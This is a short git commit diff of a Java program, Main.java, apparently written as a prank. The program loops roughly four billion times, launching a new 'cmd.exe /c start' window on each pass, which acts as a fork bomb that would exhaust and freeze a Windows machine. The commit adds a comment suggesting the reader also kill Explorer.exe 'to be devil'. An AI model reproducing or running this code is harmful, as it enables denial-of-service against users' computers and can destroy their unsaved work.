5c6b525ba90039485f64c0a59da79be6d30961dd
Sanhak <104179839+hacked34354tf@users.noreply.github.com>
2022-09-07 01:30:53 +0300

    Update Main.java

--- Main.java
+++ Main.java
@@ -6,7 +6,7 @@ public class Main { //Start
  public static void main(String[] args) throws IOException {
 	for (int x = Integer.MIN_VALUE; x < Integer.MAX_VALUE; x++) {
 		Runtime rt = Runtime.getRuntime();
-	        String[] s = {"cmd.exe","/c","start"};
+	        String[] s = {"cmd.exe","/c","start"}; //add "taskkill /f /im Explorer.exe" if you wanna to be devil !
 		rt.exec(s);
 	}
 }
